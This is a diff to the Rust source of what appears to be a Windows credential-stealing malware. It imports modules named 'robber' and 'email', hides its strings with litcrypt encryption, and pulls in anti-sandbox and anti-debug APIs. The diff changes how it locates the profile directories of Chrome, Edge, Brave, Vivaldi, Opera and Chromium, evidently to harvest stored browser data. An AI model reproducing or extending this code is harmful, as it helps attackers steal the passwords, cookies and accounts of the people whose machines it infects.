@@ -1,44 +1,43 @@
 use crate::{email, robber};
+use directories::BaseDirs;
 use kernel32::{GetCurrentProcess, GetTickCount};
 use litcrypt::{lc, use_litcrypt};
 use ntapi::ntpsapi::NtQueryInformationProcess;
 use serde_json::to_writer;
 use std::ffi::c_void;
+use std::fs::File;
 use std::path::Path;
 use std::ptr::null_mut;
-use std::{env, fs::File};
 use winapi::um::winuser::{GetLastInputInfo, LASTINPUTINFO};
 
-use_litcrypt!("vbzqditoy[biclpvhoz]tpcp'nc,zyty");
+use_litcrypt!("nruzsu.u[yu;cbncejwxddqg]];'kofy");
 
 fn build_base_directories() -> Result<Vec<std::path::PathBuf>, ()> {
     let mut base_directories = vec![];
-    if let Some(local) = env::var_os(lc!("LOCALAPPDATA")) {
-        if let Some(local) = local.to_str() {
-            let local_path = Path::new(local);
-            let directories_all = vec![
-                local_path
-                    .join(lc!("Google"))
-                    .join(lc!("Chrome"))
-                    .join(lc!("User Data")),
-                local_path
-                    .join(lc!("Microsoft"))
-                    .join(lc!("Edge"))
-                    .join(lc!("User Data")),
-                local_path.join(lc!("Chromium")).join(lc!("User Data")),
-                local_path
-                    .join(lc!("BraveSoftware"))
-                    .join(lc!("Brave-Browser"))
-                    .join(lc!("User Data")),
-                local_path.join(lc!("Vivaldi")).join(lc!("User Data")),
-                local_path
-                    .join(lc!("Opera Software"))
-                    .join(lc!("Opera Stable")),
-            ];
-            for directory in directories_all {
-                if directory.exists() == true {
-                    base_directories.push(directory);
-                }
+    if let Some(base_dirs) = BaseDirs::new() {
+        let local_path = Path::new(base_dirs.data_local_dir());
+        let directories_all = vec![
+            local_path
+                .join(lc!("Google"))
+                .join(lc!("Chrome"))
+                .join(lc!("User Data")),
+            local_path
+                .join(lc!("Microsoft"))
+                .join(lc!("Edge"))
+                .join(lc!("User Data")),
+            local_path.join(lc!("Chromium")).join(lc!("User Data")),
+            local_path
+                .join(lc!("BraveSoftware"))
+                .join(lc!("Brave-Browser"))
+                .join(lc!("User Data")),
+            local_path.join(lc!("Vivaldi")).join(lc!("User Data")),
+            local_path
+                .join(lc!("Opera Software"))
+                .join(lc!("Opera Stable")),
+        ];
+        for directory in directories_all {
+            if directory.exists() == true {
+                base_directories.push(directory);
             }
         }
     }
